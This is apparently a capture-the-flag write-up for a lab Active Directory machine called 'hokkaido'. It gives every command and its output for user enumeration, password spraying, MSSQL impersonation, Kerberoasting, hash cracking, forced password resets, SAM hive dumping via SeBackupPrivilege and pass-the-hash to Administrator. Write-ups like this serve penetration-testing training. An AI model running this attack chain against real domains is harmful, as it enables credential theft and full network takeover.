##### Tags: `AD`  `kerbrute`  `rpc`  `Kerberoasting`  `mssql`  `SeBackupPrivilege`  `pass the hash`

# 🪟 hokkaido (AD)🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.146.40

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-12 04:44:34Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
use kerbrute and default user list found 3 users
```console
$ ./kerbrute userenum --dc 192.168.146.40 -d hokkaido-aerospace.com /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt


    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 04/12/26 - Ronnie Flathers @ropnop

2026/04/12 14:37:28 >  Using KDC(s):
2026/04/12 14:37:28 >   192.168.146.40:88

2026/04/12 14:37:28 >  [+] VALID USERNAME:       info@hokkaido-aerospace.com
2026/04/12 14:37:47 >  [+] VALID USERNAME:       administrator@hokkaido-aerospace.com
2026/04/12 14:39:53 >  [+] VALID USERNAME:       discovery@hokkaido-aerospace.com
```
use weak password info info login in to smb server  
```console
$ smbclient //192.168.146.40/NETLOGON -U 'info'
Password for [WORKGROUP\info]: info

smb: \temp\> ls
  .                                   D        0  Thu Dec  7 02:44:26 2023
  ..                                  D        0  Sun Nov 26 00:40:08 2023
  password_reset.txt                  A       27  Sun Nov 26 00:40:29 2023
```
found there is a file containing password Start123!
```console
$ cat password_reset.txt
Initial Password: Start123!
```
also info info login to rpc and found a list of username
```console
$ rpcclient 192.168.146.40 -U 'info'
Password for [WORKGROUP\info]:
rpcclient $> enumdomains
name:[HAERO] idx:[0x0]
name:[Builtin] idx:[0x0]
rpcclient $> enumdomusers  
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Hazel.Green] rid:[0x452]
user:[Molly.Smith] rid:[0x453]
user:[Alexandra.Little] rid:[0x454]
user:[Victor.Kelly] rid:[0x456]
user:[Catherine.Knight] rid:[0x457]
user:[Angela.Davies] rid:[0x458]
user:[Molly.Edwards] rid:[0x459]
user:[Tracy.Wood] rid:[0x45a]
user:[Lynne.Tyler] rid:[0x45b]
user:[Charlene.Wallace] rid:[0x45c]
user:[Cheryl.Singh] rid:[0x45d]
user:[Sian.Gordon] rid:[0x45e]
user:[Gordon.Brown] rid:[0x45f]
user:[Irene.Dean] rid:[0x460]
user:[Anthony.Anderson] rid:[0x461]
user:[Julian.Davies] rid:[0x462]
user:[Hannah.O'Neill] rid:[0x463]
user:[Rachel.Jones] rid:[0x464]
user:[Declan.Woodward] rid:[0x465]
user:[Annette.Buckley] rid:[0x466]
user:[Elliott.Jones] rid:[0x467]
user:[Grace.Lees] rid:[0x468]
user:[Deborah.Francis] rid:[0x469]
user:[Bruce.Cartwright] rid:[0x46b]
user:[Nigel.Brown] rid:[0x46c]
user:[Derek.Wyatt] rid:[0x46d]
user:[discovery] rid:[0x46e]
user:[maintenance] rid:[0x46f]
user:[hrapp-service] rid:[0x473]
user:[info] rid:[0x641]
```
password sparying the username list and the password Start123!  
found the password is for discovery
```console
$ crackmapexec smb 192.168.146.40 -u user.txt -p pass.txt --continue-on-success
SMB         192.168.146.40  445    DC               [+] hokkaido-aerospace.com\discovery:Start123! 
```
port 1433 mssql found user discovery can impersonate hrappdb-reader
```console
$ netexec mssql '192.168.146.40' -u 'discovery' -p 'Start123!' -M mssql_priv  
/home/ming/.local/lib/python3.13/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.11) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
MSSQL       192.168.146.40  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:hokkaido-aerospace.com)
MSSQL       192.168.146.40  1433   DC               [+] hokkaido-aerospace.com\discovery:Start123! 
MSSQL_PRIV  192.168.146.40  1433   DC               [*] HAERO\discovery can impersonate: hrappdb-reader
```
login to mssql as discovery
```console
$ impacket-mssqlclient hokkaido-aerospace.com/discovery@192.168.146.40 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (HAERO\discovery  guest@master)>
```
impersonate as hrappdb-reader
```console
SQL (HAERO\discovery  guest@master)> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
name             
--------------   
hrappdb-reader   

SQL (HAERO\discovery  guest@master)> EXECUTE AS LOGIN = 'hrappdb-reader';
SQL (hrappdb-reader  guest@master)> 
```
found the password for user hrapp-service
```console
SQL (hrappdb-reader  guest@master)> use hrappdb; 
ENVCHANGE(DATABASE): Old Value: master, New Value: hrappdb
INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'hrappdb'.
SQL (hrappdb-reader  hrappdb-reader@hrappdb)> SELECT name FROM sys.tables;
name      
-------   
sysauth   

SQL (hrappdb-reader  hrappdb-reader@hrappdb)> select * from sysauth;
id   name               password           
--   ----------------   ----------------   
 0   b'hrapp-service'   b'Untimed$Runny'   
```
use targetedKerberoast.py found there is a SPN hash for user Hazel.Green
```console
$ ./targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.146.40
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Hazel.Green)
[+] Printing hash for (Hazel.Green)
$krb5tgs$23$*Hazel.Green$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/Hazel.Green*$76d802744549e4ab52e07b66a3f98e0b$7d6828fdd3c68cba09e7e98f7e7b947398f5a797d49177d19d653e3b22d5e91d6fbeed71ffb69d8e40a727cd5f5ca107182a56bafbed11f423b244921f17610c8c06d3af8a31ec280861b95d88c5c8e6f2b5c4dcffcc702e206c9648518fd5122fdf7784122a48af02b4b278562d24985aeb07b0e57fc6f5ce2295f5b04495ee05f55631970a6deecaac793b614e97ca315824151be95e0e2d82401339cc604ae5b69bb1cc745881f53e50b4730b4f2ec4541ff1ebecb8796f0a880b2c13442571907b38427b357fe257f9e7ee7ef83f0de68eb437a5b24dabaca7e42f67972364e648f80ceb0b6df40fd7e61bd0b86a7b1cec87281aaed5dc42c945bbff022aed8da385b48cf561a4ce72aae71514bb7f585585e0f81f07600bd2c7e2a2125ea6e75a58e65c3d28d63ab2e913c1ee2216789840c22fd93093de4f166230f55c96683e0997d32cfcfdc70c98d58b89a30ea9014068221aa2747229b0c15da231dfd7633ee3cc973ec6e41af039a62e2e3d4d6e471312de79e0eaffccae0c332006033d4361487d439526eab4ab81d3394049f0d945d2428d873f3dfcd65145fb23022d0ab843b2232a958e40649250a56d2075a945fd1714611f221ea701c449e9d3703bf6106f2879b9a0389f0255946dd34fe8f74ad10319c2e8bb0847c6479a08cada399f1b667eec354132068069eb14da76b3e7a36864a9963d188c94301a3f552afa46bec35391e04e68e10fdfddb1932a01e2dd9e837b34573809099098cbbb7aae08f632f5976d550b93a15c2be15aa6d6de9e34adcc1c832dbd45d87509110d7066d3aab75a37d80c421105cd2954090dc7fcffc6fe04f528dd80ed4b26f50c6cbaa25571a9c7094ba0cb0c15d99a8c884352384227949853dc6095ae393a7018daa836d325f0e0b1af3fc7895c7128c28820687b2bfad419fe0ac1b5f90c66b984cf52152c4952a9fb7cb1cd7fd39335b0c8ff9f221c4ff663f140944fb144778d7f18467b051a1cd65852facf4da155e6b51f22cc4594c5993d9247cf9bf8aabc05ad33114f352bd9a8adbca1f15a4343a6ad1d9a9257794dd7b44e9c45836d86753e81f7e65b23a03ed8d6aff3dffd474f7d965293567fc3d7998e88ff43ac4f71102c1bd51e5585495c27b9cf6d6f9ce5100ba04f30db440321def600abf44af0647fea000b6ea7ef3c2a3d05ef1e11f119acc3738e7fc7f28a79ec1be0369e1ef27b7be04f0b28a66bf3dbf8eed5f1ec2d2336ff41537131b0daa3f548734e820c85121adf82eaecdde92d2bd26f73df93064a4ba08cd77d428ff92b61d8a5fa04a6216b471f258431bcafb86a2633272985d4ec5129a5ed161e6572afaa51154029ab521d7946c3edb0dcf8311c8c04c033ed4bc6bd1f2a4a5d75144bfe796908951ec76f6dcb6485ee86bb2a251722b3e543011f518e9e9472b19c71b7537d7bb70097fa3775cc855bdc38b742c724b597a9e4a84d53f41b9b397a02d59e48ad21c95adc25052cb4186ce4d27066a768d5cef5bbf8fadb2f05ec628c1bc4ccce7ebe66597d857efbce647a8a8d0d3f1e04a44ca215899efecea21d8ac544a5ac95f1b5a99e9263e5f2cdb2bea1007efbc02cfa6dc703043750d262ddb7a2072d2b0f5e97
[VERBOSE] SPN removed successfully for (Hazel.Green)
```
crack the hash and got haze1988
```console
$ hashcat -m 13100 hash.txt /home/ming/Downloads/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
haze1988
```
use bloodhound-python to performed Domain Enumeration for the hokkaido-aerospace.com
```console
$ bloodhound-python -d hokkaido-aerospace.com -u 'info' -p 'info' -ns 192.168.146.40 -c all
```
in bloodhound we found that Hazel.Green is member of IT group  
it can change password of Molly.Smith which is part of the RDP user
```console
$ rpcclient 192.168.146.40 -U 'Hazel.Green'
Password for [WORKGROUP\Hazel.Green]: haze1988
rpcclient $> setuserinfo2 Molly.Smith 23 Password123
```
login to RDP
```console
$ xfreerdp3 /u:'Molly.Smith' /p:'Password123' /v:192.168.146.40 +clipboard

C:\Windows\system32>whoami
haero\molly.smith
```
## Privilege Escalation
Right click cmd.exe and login as molly.smith 
```console
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== ========
SeMachineAccountPrivilege     Add workstations to domain          Disabled
SeSystemtimePrivilege         Change the system time              Disabled
SeBackupPrivilege             Back up files and directories       Disabled
SeRestorePrivilege            Restore files and directories       Disabled
SeShutdownPrivilege           Shut down the system                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```
we can abuse SeBackupPrivilege
```console
C:\Windows\system32>reg save HKLM\SAM C:\Users\Molly.Smith\Documents\sam.hiv
The operation completed successfully.

C:\Windows\system32>reg save HKLM\SYSTEM C:\Users\Molly.Smith\Documents\system.hiv
The operation completed successfully.
```
transfer both file to kali and dump the administrator hash
```console
$ impacket-secretsdump -system system.hiv -sam sam.hiv local   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x2fcb0ca02fb5133abd227a05724cd961
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d752482897d54e239376fddb2a2109e4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```
pass the hash and login as administartor
```console
$ evil-winrm -i 192.168.146.40  -u administrator -H "d752482897d54e239376fddb2a2109e4"
                                        
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
haero\administrator
```
